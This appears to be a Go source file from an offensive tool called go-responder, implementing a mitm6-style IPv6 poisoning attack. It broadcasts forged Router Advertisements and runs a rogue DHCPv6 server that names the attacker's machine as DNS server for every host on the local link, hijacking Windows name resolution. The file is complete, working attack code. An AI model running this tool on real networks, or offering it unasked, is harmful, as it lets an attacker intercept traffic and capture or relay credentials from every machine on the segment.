package poisoner

import (
	"encoding/binary"
	"net"
	"syscall"
	"time"

	"go-responder/internal/core"
)

// DHCPv6 message types (RFC 3315 §5.3)
const (
	dhcp6Solicit       = 1
	dhcp6Advertise     = 2
	dhcp6Request       = 3
	dhcp6Confirm       = 4
	dhcp6Renew         = 5
	dhcp6Rebind        = 6
	dhcp6Reply         = 7
	dhcp6InformRequest = 11
)

// DHCPv6 option codes
const (
	dhcp6OptClientID   = 1  // RFC 3315
	dhcp6OptServerID   = 2  // RFC 3315
	dhcp6OptDNSServers = 23 // RFC 3646
	dhcp6OptDomainList = 24 // RFC 3646
)

// RunMITM6 starts DHCPv6 spoofing and periodic Router Advertisements.
// It advertises ip6 as the DNS server for all hosts on the link,
// making Windows prefer us for name resolution (RFC 4795, RFC 8106).
func RunMITM6(iface *net.Interface, ip6 net.IP) {
	core.LogInfo("mitm6: starting on %s - advertising %s as DNS", iface.Name, ip6)
	go sendRouterAdvertisements(iface, ip6)
	serveDHCPv6(iface, ip6)
}

// ─── Router Advertisement ────────────────────────────────────────────────────

// sendRouterAdvertisements sends periodic ICMPv6 RA packets with RDNSS option
// (RFC 4861, RFC 8106) to ff02::1 every 30 seconds.
func sendRouterAdvertisements(iface *net.Interface, ip6 net.IP) {
	pc, err := net.ListenPacket("ip6:ipv6-icmp", "::")
	if err != nil {
		core.LogError("mitm6 RA: requires root privileges for raw ICMPv6 socket - %v", err)
		return
	}
	defer pc.Close()

	// Bind outgoing multicast to our interface so the RA goes out the right link.
	if rc, err := pc.(*net.IPConn).SyscallConn(); err == nil {
		rc.Control(func(fd uintptr) {
			syscall.SetsockoptInt(int(fd), syscall.IPPROTO_IPV6, syscall.IPV6_MULTICAST_IF, iface.Index)
		})
	}

	dst := &net.IPAddr{IP: net.ParseIP("ff02::1"), Zone: iface.Name}
	pkt := buildRA(ip6)
	core.LogInfo("mitm6: Router Advertisements -> ff02::1 (RDNSS = %s)", ip6)
	for {
		pc.WriteTo(pkt, dst)
		time.Sleep(30 * time.Second)
	}
}

// buildRA builds a raw ICMPv6 Router Advertisement (Type 134) with:
//   - M=1, O=1 flags (trigger DHCPv6 stateful + stateless on clients)
//   - Router Lifetime = 1800s
//   - RDNSS option pointing to ip6 (Lifetime = 600s)
func buildRA(ip6 net.IP) []byte {
	ip16 := ip6.To16()
	if ip16 == nil {
		ip16 = make([]byte, 16)
	}
	var b []byte
	b = append(b, 134)    // ICMPv6 Type: Router Advertisement
	b = append(b, 0)      // Code: 0
	b = append(b, 0, 0)   // Checksum: kernel fills for SOCK_RAW IPPROTO_ICMPV6
	b = append(b, 64)     // Cur Hop Limit
	b = append(b, 0xC0)   // Flags: M=1 (Managed) | O=1 (Other config)
	b = binary.BigEndian.AppendUint16(b, 1800) // Router Lifetime (s)
	b = binary.BigEndian.AppendUint32(b, 0)    // Reachable Time
	b = binary.BigEndian.AppendUint32(b, 0)    // Retrans Timer

	// RDNSS option (RFC 8106 §5.1)
	// Type=25, Length in 8-byte units: (8 header + 16 addr) / 8 = 3
	b = append(b, 25)    // Option Type: RDNSS
	b = append(b, 3)     // Length: 3 * 8 = 24 bytes
	b = append(b, 0, 0)  // Reserved
	b = binary.BigEndian.AppendUint32(b, 600) // Lifetime (s)
	b = append(b, ip16...)

	return b
}

// ─── DHCPv6 server ───────────────────────────────────────────────────────────

// serveDHCPv6 listens on UDP port 547 for DHCPv6 messages and responds
// with our ip6 as the DNS server (RFC 3315, RFC 3646).
func serveDHCPv6(iface *net.Interface, ip6 net.IP) {
	pc, err := net.ListenPacket("udp6", "[::]:547")
	if err != nil {
		core.LogError("mitm6 DHCPv6: requires root privileges to bind :547 - %v", err)
		return
	}
	defer pc.Close()

	// Join ff02::1:2 (all-DHCP-agents multicast) on our interface.
	if uc, ok := pc.(*net.UDPConn); ok {
		if rc, err := uc.SyscallConn(); err == nil {
			rc.Control(func(fd uintptr) {
				mreq := &syscall.IPv6Mreq{Interface: uint32(iface.Index)}
				copy(mreq.Multiaddr[:], net.ParseIP("ff02::1:2").To16())
				syscall.SetsockoptIPv6Mreq(int(fd), syscall.IPPROTO_IPV6, syscall.IPV6_JOIN_GROUP, mreq)
			})
		}
	}

	core.LogInfo("mitm6: DHCPv6 listening on [::]:547")
	buf := make([]byte, 1500)
	for {
		n, src, err := pc.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go func(data []byte, addr net.Addr) {
			resp := HandleDHCPv6Packet(data, iface, ip6)
			if resp != nil {
				pc.WriteTo(resp, addr)
			}
		}(pkt, src)
	}
}

// HandleDHCPv6Packet processes one DHCPv6 message and returns the reply.
// Exported so tests can call it directly without a network socket.
func HandleDHCPv6Packet(pkt []byte, iface *net.Interface, dnsIP net.IP) []byte {
	if len(pkt) < 4 {
		return nil
	}
	msgType := pkt[0]
	txID := [3]byte{pkt[1], pkt[2], pkt[3]}
	opts := pkt[4:]

	clientDUID := findDHCPv6Option(opts, dhcp6OptClientID)

	switch msgType {
	case dhcp6Solicit:
		core.LogVerbose("mitm6: DHCPv6 Solicit -> Advertise (DNS = %s)", dnsIP)
		return buildDHCPv6Msg(dhcp6Advertise, txID, clientDUID, iface, dnsIP)

	case dhcp6Request, dhcp6Confirm, dhcp6Renew, dhcp6Rebind:
		core.LogVerbose("mitm6: DHCPv6 Request/Confirm/Renew/Rebind -> Reply (DNS = %s)", dnsIP)
		return buildDHCPv6Msg(dhcp6Reply, txID, clientDUID, iface, dnsIP)

	case dhcp6InformRequest:
		core.LogVerbose("mitm6: DHCPv6 Information-Request -> Reply (DNS = %s)", dnsIP)
		return buildDHCPv6Msg(dhcp6Reply, txID, clientDUID, iface, dnsIP)
	}
	return nil
}

// buildDHCPv6Msg builds a DHCPv6 reply message (RFC 3315 §6).
func buildDHCPv6Msg(msgType byte, txID [3]byte, clientDUID []byte, iface *net.Interface, dnsIP net.IP) []byte {
	var b []byte
	b = append(b, msgType)
	b = append(b, txID[:]...)

	// Option 1: Client ID (echo back)
	if len(clientDUID) > 0 {
		b = append(b, dhcpv6Option(dhcp6OptClientID, clientDUID)...)
	}

	// Option 2: Server ID (DUID-LL: type=3, hw=1, MAC)
	b = append(b, dhcpv6Option(dhcp6OptServerID, buildDUIDLL(iface))...)

	// Option 23: DNS Recursive Name Servers (RFC 3646)
	ip16 := dnsIP.To16()
	if ip16 == nil {
		ip16 = make([]byte, 16)
	}
	b = append(b, dhcpv6Option(dhcp6OptDNSServers, ip16)...)

	return b
}

// buildDUIDLL builds a DUID-LL (Link-Layer, type 3) from the interface MAC.
// Format: type(2) + hw_type(2) + mac(6) = 10 bytes.
func buildDUIDLL(iface *net.Interface) []byte {
	mac := iface.HardwareAddr
	if len(mac) == 0 {
		mac = make([]byte, 6)
	}
	duid := []byte{0x00, 0x03, 0x00, 0x01}
	return append(duid, mac...)
}

// dhcpv6Option builds a TLV-encoded DHCPv6 option (code + len + data).
func dhcpv6Option(code uint16, data []byte) []byte {
	b := make([]byte, 4+len(data))
	binary.BigEndian.PutUint16(b[0:2], code)
	binary.BigEndian.PutUint16(b[2:4], uint16(len(data)))
	copy(b[4:], data)
	return b
}

// findDHCPv6Option searches options bytes for the given option code
// and returns its data, or nil if not found.
func findDHCPv6Option(opts []byte, code uint16) []byte {
	for len(opts) >= 4 {
		c := binary.BigEndian.Uint16(opts[0:2])
		l := int(binary.BigEndian.Uint16(opts[2:4]))
		opts = opts[4:]
		if len(opts) < l {
			break
		}
		if c == code {
			return opts[:l]
		}
		opts = opts[l:]
	}
	return nil
}
